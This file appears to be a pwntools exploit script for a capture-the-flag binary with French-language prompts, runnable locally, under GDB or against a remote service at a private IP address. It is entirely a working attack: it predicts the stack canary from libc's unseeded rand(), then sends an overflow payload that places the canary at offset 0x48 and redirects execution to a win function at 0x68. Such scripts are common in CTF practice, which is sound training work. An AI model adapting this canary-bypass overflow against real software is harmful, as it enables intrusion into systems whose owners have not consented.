from pwn import *
from ctypes import CDLL

libc = CDLL('libc.so.6')
CANARY = libc.rand()

exe_path = '../dist/1_chal'
exe = context.binary = ELF(exe_path)

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    io = gdb.debug(exe_path)
elif args.REMOTE:
    io = remote("192.168.10.11", 4000)
else:
    io = process(exe_path)

io.sendlineafter(b'arrivant ? (y/n)', b'Y')

for i in range(10):
    io.sendlineafter(b'votre choix : ', b'0')
    io.sendlineafter(b'continue ? (y/n)', b'y')

p = flat({
    0x48: p64(CANARY),
    0x68: exe.sym.gagne
})

io.sendlineafter(b'votre choix : ',p)

io.interactive()